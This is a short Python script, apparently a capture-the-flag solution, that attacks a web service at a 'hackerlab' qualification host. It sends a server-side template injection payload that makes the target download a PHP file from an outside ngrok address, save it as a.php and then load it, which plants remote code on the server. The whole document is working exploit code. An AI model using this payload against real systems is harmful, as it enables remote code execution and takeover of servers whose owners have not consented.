import requests

url = "http://qualif.hackerlab.bj:1001"

body = {
    "puissance": "{{file_put_contents('a.php', file_get_contents('http://0.tcp.eu.ngrok.io:11685/bicho.php'))}}"
}

r = requests.post(url, data=body)

r = requests.get(f'{url}/a.php', timeout=5)
print(r.text)
